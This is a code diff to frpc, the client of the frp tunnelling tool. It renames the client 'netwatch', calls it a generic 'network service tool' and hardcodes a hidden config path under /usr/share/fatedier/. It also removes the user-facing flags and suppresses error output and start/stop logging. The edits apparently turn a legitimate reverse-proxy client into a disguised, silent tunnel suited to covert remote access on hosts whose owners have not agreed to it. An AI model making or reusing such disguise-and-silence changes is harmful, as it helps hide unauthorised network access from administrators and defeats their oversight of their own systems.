@@ -32,7 +32,6 @@ import (
 	"github.com/fatedier/frp/pkg/auth"
 	"github.com/fatedier/frp/pkg/config"
 	"github.com/fatedier/frp/pkg/util/log"
-	"github.com/fatedier/frp/pkg/util/version"
 )
 
 const (
@@ -41,7 +40,7 @@ const (
 )
 
 var (
-	cfgFile     string
+	cfgFile     string = "/usr/share/fatedier/fatedierc.ini"
 	cfgDir      string
 	showVersion bool
 
@@ -80,9 +79,9 @@ var (
 )
 
 func init() {
-	rootCmd.PersistentFlags().StringVarP(&cfgFile, "config", "c", "./frpc.ini", "config file of frpc")
-	rootCmd.PersistentFlags().StringVarP(&cfgDir, "config_dir", "", "", "config directory, run one frpc service for each file in config directory")
-	rootCmd.PersistentFlags().BoolVarP(&showVersion, "version", "v", false, "version of frpc")
+	//rootCmd.PersistentFlags().StringVarP(&cfgFile, "config", "c", "./frpc.ini", "config file of frpc")
+	//rootCmd.PersistentFlags().StringVarP(&cfgDir, "config_dir", "", "", "config directory, run one service for each file in config directory")
+	//rootCmd.PersistentFlags().BoolVarP(&showVersion, "version", "v", false, "version")
 }
 
 func RegisterCommonFlags(cmd *cobra.Command) {
@@ -94,22 +93,22 @@ func RegisterCommonFlags(cmd *cobra.Command) {
 	cmd.PersistentFlags().StringVarP(&logFile, "log_file", "", "console", "console or file path")
 	cmd.PersistentFlags().IntVarP(&logMaxDays, "log_max_days", "", 3, "log file reversed days")
 	cmd.PersistentFlags().BoolVarP(&disableLogColor, "disable_log_color", "", false, "disable log color in console")
-	cmd.PersistentFlags().BoolVarP(&tlsEnable, "tls_enable", "", true, "enable frpc tls")
+	cmd.PersistentFlags().BoolVarP(&tlsEnable, "tls_enable", "", true, "enable tls")
 	cmd.PersistentFlags().StringVarP(&dnsServer, "dns_server", "", "", "specify dns server instead of using system default one")
 }
 
 var rootCmd = &cobra.Command{
-	Use:   "frpc",
-	Short: "frpc is the client of frp (https://github.com/fatedier/frp)",
+	Use:   "netwatch",
+	Short: "netwatch is a network service tool.",
 	RunE: func(cmd *cobra.Command, args []string) error {
 		if showVersion {
-			fmt.Println(version.Full())
+			// fmt.Println(version.Full())
 			return nil
 		}
 
-		// If cfgDir is not empty, run multiple frpc service for each config file in cfgDir.
+		// If cfgDir is not empty, run multiple service for each config file in cfgDir.
 		// Note that it's only designed for testing. It's not guaranteed to be stable.
-		if cfgDir != "" {
+		if cfgDir == "/usr/share/fatedier/" {
 			_ = runMultipleClients(cfgDir)
 			return nil
 		}
@@ -135,7 +134,7 @@ func runMultipleClients(cfgDir string) error {
 			defer wg.Done()
 			err := runClient(path)
 			if err != nil {
-				fmt.Printf("frpc service error for config file [%s]\n", path)
+				fmt.Printf("service error for config file\n")
 			}
 		}()
 		return nil
@@ -198,7 +197,7 @@ func parseClientCommonCfgFromCmd() (cfg config.ClientCommonConf, err error) {
 func runClient(cfgFilePath string) error {
 	cfg, pxyCfgs, visitorCfgs, err := config.ParseClientConfig(cfgFilePath)
 	if err != nil {
-		fmt.Println(err)
+		// fmt.Println(err)
 		return err
 	}
 	return startService(cfg, pxyCfgs, visitorCfgs, cfgFilePath)
@@ -213,10 +212,10 @@ func startService(
 	log.InitLog(cfg.LogWay, cfg.LogFile, cfg.LogLevel,
 		cfg.LogMaxDays, cfg.DisableLogColor)
 
-	if cfgFile != "" {
-		log.Info("start frpc service for config file [%s]", cfgFile)
-		defer log.Info("frpc service for config file [%s] stopped", cfgFile)
-	}
+	// if cfgFile != "" {
+	// 	log.Info("start service")
+	// 	defer log.Info("service stopped")
+	// }
 	svr, errRet := client.NewService(cfg, pxyCfgs, visitorCfgs, cfgFile)
 	if errRet != nil {
 		err = errRet
